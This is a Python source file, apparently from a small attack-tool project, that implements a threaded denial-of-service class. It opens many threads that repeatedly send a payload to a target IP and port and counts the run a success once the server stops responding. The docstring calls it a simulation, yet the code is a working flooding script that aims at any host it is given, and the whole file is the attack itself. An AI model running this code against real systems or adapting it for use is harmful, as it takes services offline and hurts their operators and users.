from attack import Attack
from client import Client
from colorama import Fore, Style

import threading
import time

class DDoS(Attack):
    __amount_of_threads = 50
    __client = None
    __threads = []
    __the_end = False
    __single_client_amount_of_requests = 50

    
    def __init__(self, ip, port, amount_of_threads, single_client_amount_of_requests, paylaod="some random paylaod"):
        super().__init__(ip, port)
        self.__amount_of_threads = amount_of_threads
        self.__client = Client(ip, port, paylaod)
        self.__single_client_amount_of_requests = single_client_amount_of_requests


    def wave(self) -> None:
        ''' Sending a wave of requests to the server. '''
        for i in range(self.__single_client_amount_of_requests):
            self.__client.send_paylaod()
            ping = self.__client.accept_payload()
            if ping == "-2.0":
                print(Fore.GREEN + f'[+] The server has stopped responding. Success.' + Style.RESET_ALL)
                self.__the_end = True
                return
            time.sleep(1)


    def run(self):
        ''' Running simulation of DDoS attack. '''
        print(Fore.RED + '[*] The attack has started.' + Style.RESET_ALL)
        self.__client.connect_to_host()
        for i in range(self.__amount_of_threads):
            t = threading.Thread(target=self.wave)
            t.daemon = True
            self.__threads.append(t)

        for i in range(self.__amount_of_threads):
            self.__threads[i].start()
            if self.__the_end:
                break
            time.sleep(0.05)
        
        for i in range(self.__amount_of_threads):
            try:
                self.__threads[i].join()
            except:
                pass
        
        if not self.__the_end:
            print(Fore.RED + f'[-] The server hasn\'t stopped responding. Failed.' + Style.RESET_ALL)


        ''' Attak has finished '''
        self.__client.disconnect_from_host()

 